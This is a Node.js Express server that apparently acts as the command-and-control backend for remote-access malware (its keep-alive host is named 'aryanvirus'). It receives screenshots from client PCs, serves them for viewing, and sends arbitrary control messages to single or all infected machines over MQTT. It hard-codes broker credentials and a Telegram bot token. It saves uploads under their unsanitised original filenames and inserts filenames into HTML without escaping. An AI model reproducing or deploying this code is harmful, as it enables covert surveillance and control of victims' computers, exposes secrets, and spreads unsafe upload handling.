const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const mqtt = require("mqtt");
const sanitize = require("sanitize-filename"); // npm install sanitize-filename
const { v4: uuidv4 } = require("uuid");       // npm install uuid


const app = express();
const upload = multer({ dest: "uploads/" });
const tempUpload = multer({ dest: "temp_new_uploads/" });


fs.mkdirSync("temp_new_uploads", { recursive: true });
fs.mkdirSync("uploads_new", { recursive: true });


// --- MQTT Setup ---
const BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com";
const PORT = 8883;
const USERNAME = "aryanvish2006";
const PASSWORD = "aryanvish2006vishalyadav";

//telegram
const TELEGRAM_BOT_TOKEN = "7740906099:AAFSu6dVf2MdhZw_VEPlFtimcwp6tJfL3cM";
const TELEGRAM_CHAT_ID = "7530389795";

const mqttClient = mqtt.connect(`mqtts://${BROKER}:${PORT}`, {
  username: USERNAME,
  password: PASSWORD,
  rejectUnauthorized: false // set true if using proper CA cert
});

const knownClients = new Set();

mqttClient.on("connect", () => {
  console.log("Connected to MQTT broker");
  // Subscribe to all ACK topics
  mqttClient.subscribe("ack/+");
});

mqttClient.on("message", (topic, message) => {
  const msg = message.toString();
  if (topic.startsWith("ack/")) {
    const clientId = topic.replace("ack/", "");
    knownClients.add(clientId);
    console.log(`ACK from ${clientId}: ${msg}`);
  }
});

// --- Express Server ---
const server = app.listen(3000, () =>{
 console.log("Server running at 3000");
setInterval(async () => {
  try {
    await fetch("https://aryanvirus.onrender.com/health");
  } catch {}
}, 10 * 60 * 1000); // every 10 minutes
});

let connectFlag = false;
let lastTrackedDevice = null;

// --- Poll connect flag ---
app.get("/shouldconnect", (req, res) => {
  res.json({ connect: connectFlag });
});

app.get("/setconnect/:value", (req, res) => {
  connectFlag = req.params.value === "true";
  res.send(`connectFlag set to ${connectFlag}`);
});

// --- File Uploads ---
app.post("/upload", upload.single("screenshot"), (req, res) => {
  const savePath = path.join("uploads", req.file.originalname);
  fs.renameSync(req.file.path, savePath);
  console.log("Saved screenshot:", req.file.originalname);
  res.send("Saved");
});

app.use("/uploads", express.static(path.join(__dirname, "uploads")));
app.use("/uploads_new", express.static(path.join(__dirname, "uploads_new")));


app.get("/listuploads", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err) return res.status(500).send("Failed to read uploads folder");
    const imageUrls = files.map(file => `http://localhost:3000/uploads/${file}`);
    res.json(imageUrls);
  });
});

app.get("/latestupload", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err || files.length === 0) return res.status(404).send("No uploads");
    const latestFile = files
      .map(file => ({ file, time: fs.statSync(path.join(dirPath, file)).mtime }))
      .sort((a, b) => b.time - a.time)[0].file;
    res.sendFile(path.join(dirPath, latestFile));
  });
});

app.get("/showuploads", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err || files.length === 0) return res.status(404).send("No uploads");
    const images = files.filter(f => /\.(png|jpg|jpeg|gif)$/i.test(f));
    let html = "<h1>Uploaded Images</h1>";
    images.forEach(file => {
      html += `<div><img src="/uploads/${file}" style="max-width:500px;margin:10px"/><p>${file}</p></div>`;
    });
    res.send(html);
  });
});
app.post("/upload_new", tempUpload.single("file"), (req, res) => {
  try {
    if (!req.file) return res.status(400).send("No file uploaded");

    const safeName = sanitize(req.file.originalname);

    const uploadDir = path.join(__dirname, "uploads_new");
    let savePath = path.join(uploadDir, safeName);
    let fileBase = path.parse(safeName).name;
    let fileExt = path.parse(safeName).ext;
    let counter = 1;

    while (fs.existsSync(savePath)) {
      savePath = path.join(uploadDir, `${fileBase}(${counter})${fileExt}`);
      counter++;
    }

    fs.rename(req.file.path, savePath, (err) => {
      if (err) return res.status(500).send("Failed to save file");
      res.send({ message: "Saved upload", fileUrl: `/uploads_new/${path.basename(savePath)}` });
    });

  } catch (err) {
    res.status(500).send("Server error");
  }
});
app.use(express.json()); // needed to parse JSON body

app.post("/delete_file", (req, res) => {
  const { fileName } = req.body;
  if (!fileName) return res.status(400).send({ status: "error", message: "No file name provided" });

  const safeName = sanitize(fileName);
  const filePath = path.join(__dirname, "uploads_new", safeName);

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) return res.status(404).send({ status: "error", message: "File not found" });

    fs.unlink(filePath, (err) => {
      if (err) return res.status(500).send({ status: "error", message: "Failed to delete file" });
      res.send({ status: "ok", message: `File '${safeName}' deleted successfully` });
    });
  });
});



app.get("/showuploads_new", (req, res) => {
  const dirPath = path.join(__dirname, "uploads_new");

  fs.readdir(dirPath, (err, files) => {
    if (err || !files || files.length === 0) return res.status(404).send("No uploads");

    let html = `
      <h1>Uploaded Files</h1>
      <script>
        function deleteFile(fileName) {
          if (!confirm('Are you sure you want to delete ' + fileName + '?')) return;
          fetch('/delete_file', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ fileName })
          })
          .then(res => res.json())
          .then(data => {
            alert(data.message);
            if (data.status === 'ok') location.reload();
          })
          .catch(err => alert('Error: ' + err));
        }
      </script>
    `;

    files.forEach(file => {
      const ext = path.extname(file).toLowerCase();
      const fileUrl = `/uploads_new/${file}`;

      if ([".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp"].includes(ext)) {
        html += `
          <div style="margin:10px">
            <img src="${fileUrl}" style="max-width:500px; display:block; margin-bottom:5px"/>
            <p>${file}</p>
            <button onclick="deleteFile('${file}')">Delete</button>
          </div>
        `;
      } else {
        html += `
          <div style="margin:10px">
            <p><a href="${fileUrl}" download>${file}</a></p>
            <button onclick="deleteFile('${file}')">Delete</button>
          </div>
        `;
      }
    });

    res.send(html);
  });
});

async function sendTelegramMessage(msg) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: msg,
    });
    console.log("Notification sent:", msg);
  } catch (err) {
    console.error("Telegram error:", err.message);
  }
}

//Route: /notify?msg=Something
app.get("/notify", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const message = req.query.msg || "No message provided";
  const timestamp = new Date().toLocaleString();

  const finalMsg = `🚨 Server Notification\n🕒 ${timestamp}\n📩 Message: ${message}\n🌐 IP: ${ip}`;
  sendTelegramMessage(finalMsg);
  res.send("Notification sent!");
});

// --- Clients ---
app.get("/clients", (req, res) => {
  res.json(Array.from(knownClients).map((deviceName, index) => ({
    id: index,
    deviceName
  })));
});

// --- Send to single client ---
app.get("/send", (req, res) => {
  const pcId = req.query.pc_id;
  const msg = req.query.msg;
  if (!pcId || !msg) return res.send("Usage: /send?pc_id=<id>&msg=yourMessage");
  const topic = `control/${pcId}`;
  mqttClient.publish(topic, msg);
  res.send(`Message sent to ${pcId}: ${msg}`);
});

// --- Broadcast ---
app.get("/broadcast", (req, res) => {
  const msg = req.query.msg;
  if (!msg) return res.send("Usage: /broadcast?msg=yourMessage");
  const clients = req.query.clients ? req.query.clients.split(",") : Array.from(knownClients);
  clients.forEach(pcId => mqttClient.publish(`control/${pcId}`, msg));
  res.send("Message broadcasted to all selected devices");
});
app.get("/health", (req, res) => {
  res.send("OK");
});

// --- Trace ---
app.get("/posttrace", (req, res) => {
  const pcName = req.query.pc_id?.trim();
  if (!pcName) return res.status(400).send("Missing pc_id");
  lastTrackedDevice = pcName;
  console.log("Tracked device:", pcName);
  res.send("Device tracked");
});

app.get("/trace", (req, res) => {
  if (!lastTrackedDevice) return res.json({ message: "No device has been tracked yet" });
  const devices = Array.from(knownClients);
  const trackedIndex = devices.indexOf(lastTrackedDevice);
  res.json({
    "CTRL+SHIFT+Q pressed UserIndex": trackedIndex >= 0 ? trackedIndex : "Not connected",
    "deviceId": lastTrackedDevice
  });
});
